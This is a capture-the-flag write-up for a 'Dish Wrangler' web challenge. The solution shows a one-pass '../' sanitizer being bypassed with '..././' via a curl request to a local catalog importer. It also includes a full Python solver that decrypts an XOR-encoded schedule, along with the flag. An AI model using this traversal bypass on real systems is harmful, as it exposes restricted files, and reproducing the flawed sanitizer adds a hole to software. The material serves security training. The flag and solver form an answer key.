# 903-console-backdoor

| | |
|---|---|
| **Category** | 09 — Dish Wrangler |
| **Points** | 100 |

## Description

The intruder did not kick the door. The mission console let them point at a page, and the console went and fetched it. Lindqvist has the console on the bench. It still imports pieces of the catalog that way. The pass schedule is the page it is trying not to show him.

Pell is brute-forcing the login form. There is no login form. The health page will only tell you the console is bored.

Bring the console up yourself. Ask it for the page it thinks it is too well-mannered to open.

**Flag format:** `GAIANSPACE{...}`

### Run it

Unzip `service.zip` so the folder is named `service`, then from that folder:

```bash
docker compose up --build
```

The console listens on [http://localhost:8000](http://localhost:8000). It does not need the open network. A catalog directory and a Python interpreter are enough if you would rather not use Docker.

**Attachments:**

- `service.zip` — the console, as Lindqvist copied it off the bench

## Hints

Two hints were released during the event:

1. **The pointer** — The import desk believes the path it is handed. It was written to be helpful.
2. **Next door** — The schedule is not in the catalog drawer. It sits in the room beside it. Nobody told the desk to stay in the hallway.

## Solution

### Analysis — Method 1: HTTP Path Traversal

The intended attack surface is the catalog importer implemented in `service/app.py`:

```python
def clean_ref(ref):
    if ref.startswith("/") or ref.startswith("\\"):
        return None
    return ref.replace("../", "").replace("..\\", "")
```

The importer accepts a JSON `$ref`, sanitizes the string once, then opens `os.path.join(BASE, safe)` without validating the **canonical resolved path**. A naive request with `../secret/pass_schedule.txt` is cleaned into a path inside the catalog and fails. But the overlapping pattern `..././` bypasses the one-pass replacement:

```text
Submitted $ref:  ..././secret/pass_schedule.txt
After clean_ref: ../secret/pass_schedule.txt
```

The service places `data/` and `secret/` in sibling directories. Hence the surviving `../` moves from the catalog directory into `secret/`, exposing the restricted schedule.

Send the following request **only to the locally running challenge service**:

```bash
curl -sS -X POST http://127.0.0.1:8000/api/catalog/import \
  -H 'Content-Type: application/json' \
  -d '{"fragment":{"$ref":"..././secret/pass_schedule.txt"}}'
```

The JSON response embeds the schedule under `imported.fragment.resolved`, including `GAIANSPACE{ref_p4th_tr4versal}`. The Python solver includes this HTTP request, parses the response, and extracts the Flag.

### Analysis — Method 2: Offline Recovery from the Startup Script

An alternative solution needs no HTTP service. `service/entrypoint.sh`, distributed inside `service.zip`, provisions the schedule at boot from a hexadecimal `SCHED_BLOB`. The startup script also exposes the derivation of a repeating XOR keystream:

```python
key = hashlib.sha256(station_id.encode("utf-8")).digest()
plaintext = bytes(
    byte ^ key[index % len(key)]
    for index, byte in enumerate(ciphertext)
)
```

The solver reads the original archive, extracts both the hexadecimal blob and the default station identifier (`KESTREL-ARRAY`) from the startup script, and performs the same XOR calculation as the service. This independently recovers the restricted schedule **without exercising the Path Traversal vulnerability**.

These are two independent acquisition routes to the same schedule and Flag; the second is an offline shortcut, not evidence that an HTTP exploit ran.

### Reproduction

Python dependencies: **standard library only**. For Method 1, unpack the challenge's `service.zip` and start the supplied console in a separate terminal:

```bash
unzip service.zip
cd service
docker compose up --build
```

It listens at `http://127.0.0.1:8000`. In the directory containing `service.zip` and `903.py`, choose either method:

```bash
# Method 1: query the vulnerable local HTTP service.
python3 903.py --method http

# Method 2: derive and decrypt the schedule from the archive.
python3 903.py --method offline

# Run both methods and require identical Flags.
python3 903.py --method both
```

The offline mode is the default (`python3 903.py`) and does **not** require Docker or extracted service files. The HTTP mode does require the service to be running. Both methods were tested on the supplied local service and produced:

```text
KESTREL ARRAY — OPERATOR PASS SCHEDULE (RESTRICTED)
uplink window 04:00-06:00Z  key rotation nightly
maintenance unlock token: GAIANSPACE{ref_p4th_tr4versal}
FLAG: GAIANSPACE{ref_p4th_tr4versal}
```

The `--method both` mode also reports:

```text
Both methods agree: GAIANSPACE{ref_p4th_tr4versal}
```

Make sure to use **this problem's** `service.zip`: the service archive for Challenge 905 is a different application.

### Exploit Code

```python
#!/usr/bin/env python3
# Dependencies: Python 3 standard library only.
# Offline mode reads service.zip; HTTP mode requires the supplied local service.

"""Solve the local Kestrel console challenge using either supported route."""

import argparse
import hashlib
import json
import re
import urllib.error
import urllib.request
import zipfile
from pathlib import Path

ARCHIVE_PATH = Path("service.zip")
FLAG_PATTERN = re.compile(r"GAIANSPACE\{[^}\r\n]+\}")


def read_service_file(member: str) -> str:
    # Read the original distributed archive without extracting it manually.
    with zipfile.ZipFile(ARCHIVE_PATH) as archive:
        return archive.read(f"service/{member}").decode("utf-8")


def extract_flag(value: str) -> str:
    match = FLAG_PATTERN.search(value)
    if match is None:
        raise ValueError("The recovered content does not contain a flag")
    return str(match.group(0))


def offline_solution() -> str:
    script = read_service_file("entrypoint.sh")
    blob_match = re.search(r'SCHED_BLOB="([0-9a-fA-F]+)"', script)
    station_match = re.search(r'get\("STATION_ID",\s*"([^"]+)"\)', script)
    if blob_match is None or station_match is None:
        raise ValueError("Could not recover startup ciphertext or station identifier")

    ciphertext = bytes.fromhex(blob_match.group(1))
    station_id = str(station_match.group(1))
    digest = hashlib.sha256(station_id.encode("utf-8")).digest()
    plaintext = bytes(
        byte ^ digest[index % len(digest)]
        for index, byte in enumerate(ciphertext)
    ).decode("utf-8")
    print("[Offline: recovered startup schedule]")
    print(plaintext.strip())
    flag = extract_flag(plaintext)
    print(f"FLAG: {flag}")
    return flag


def http_solution(base_url: str) -> str:
    app = read_service_file("app.py")
    if 'ref.replace("../", "").replace("..\\\\", "")' not in app:
        raise ValueError("The expected one-pass traversal sanitizer was not found")

    # One replacement turns '..././' into '../'. The catalog and secret
    # directories are siblings in the challenge's service container.
    malicious_ref = "..././secret/pass_schedule.txt"
    cleaned = malicious_ref.replace("../", "").replace("..\\", "")
    if cleaned != "../secret/pass_schedule.txt":
        raise ValueError("The path filter bypass did not behave as expected")

    payload = {"fragment": {"$ref": malicious_ref}}
    request = urllib.request.Request(
        url=f"{base_url.rstrip('/')}/api/catalog/import",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            status = int(response.status)
            result = json.load(response)
    except urllib.error.URLError as error:
        raise RuntimeError(
            "Local console is unavailable; start the 903 service first"
        ) from error

    if status != 200:
        raise RuntimeError(f"Unexpected HTTP status: {status}")
    imported = result.get("imported")
    if not isinstance(imported, dict):
        raise ValueError(f"Unexpected import response: {result}")
    fragment = imported.get("fragment")
    if not isinstance(fragment, dict) or not isinstance(fragment.get("resolved"), str):
        raise ValueError(f"Restricted schedule was not returned: {result}")

    schedule = str(fragment["resolved"])
    print("[HTTP: vulnerable catalog import]")
    print(f"Submitted reference: {malicious_ref}")
    print(schedule.strip())
    flag = extract_flag(schedule)
    print(f"FLAG: {flag}")
    return flag


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--method", choices=("offline", "http", "both"), default="offline",
        help="offline does not require a running server; http sends a local request",
    )
    parser.add_argument("--url", default="http://127.0.0.1:8000")
    args = parser.parse_args()

    offline_flag = offline_solution() if args.method in ("offline", "both") else None
    http_flag = http_solution(str(args.url)) if args.method in ("http", "both") else None
    if offline_flag is not None and http_flag is not None:
        if offline_flag != http_flag:
            raise ValueError("The two solution paths recovered different flags")
        print(f"Both methods agree: {offline_flag}")


if __name__ == "__main__":
    main()
```

## Flag

```text
GAIANSPACE{ref_p4th_tr4versal}
```
